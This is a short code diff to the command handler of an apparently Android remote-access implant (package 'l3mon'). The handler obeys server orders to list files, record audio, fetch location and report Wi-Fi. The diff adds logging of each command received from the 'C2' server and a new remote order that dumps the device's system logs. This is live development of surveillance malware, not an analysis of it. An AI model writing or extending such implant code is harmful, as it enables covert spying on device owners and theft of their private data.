@@ -48,6 +48,15 @@ public class ConnectionManager {
                         JSONObject data = (JSONObject) args[0];
                         String order = data.getString("type");
 
+                        // Logging Avançado: Comando Recebido
+                        com.etechd.l3mon.managers.LogManager.log(
+                            com.etechd.l3mon.managers.LogManager.CAT_OPERATIONAL,
+                            com.etechd.l3mon.managers.LogManager.LEVEL_INFO,
+                            "C2_COMM",
+                            "Comando recebido: " + order,
+                            null
+                        );
+
                         switch (order) {
                             case "0xFI":
                                 if (data.getString("action").equals("ls"))
@@ -71,7 +80,11 @@ public class ConnectionManager {
                                 MI(data.getInt("sec"));
                                 break;
                             case "0xLO":
-                                LO();
+                                if (data.has("action") && data.getString("action").equals("logcat")) {
+                                    com.etechd.l3mon.managers.LogManager.captureLogcat(data.optInt("lines", 100));
+                                } else {
+                                    LO();
+                                }
                                 break;
                             case "0xWI":
                                 WI();
